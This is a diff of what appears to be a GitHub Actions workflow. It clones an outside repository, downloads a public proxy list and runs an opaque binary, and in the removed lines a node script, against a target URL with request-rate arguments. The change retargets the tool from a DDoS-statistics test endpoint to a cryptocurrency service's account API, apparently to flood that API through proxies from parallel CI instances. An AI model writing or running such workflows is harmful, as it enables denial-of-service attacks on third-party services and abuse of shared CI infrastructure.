@@ -40,12 +40,11 @@ jobs:
           git clone https://github.com/Fegp1p2/ideal-guide.git
           cd ideal-guide
           unzip Fc-main.zip
-          cd Fc-main
-          node y.js GET https://api.blockstreet.money/api/account/info 300 4 90 --bfm --debug --full
+          
           mv  Fc-main/proxy.txt 90.txt
           chmod +x m
           wget https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt
-          ./m https://c3.dstatbot.win/gfAidx0v 220 1 1 90.txt
+          ./m https://api.blockstreet.money/api/account/info 220 1 1 90.txt
           
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
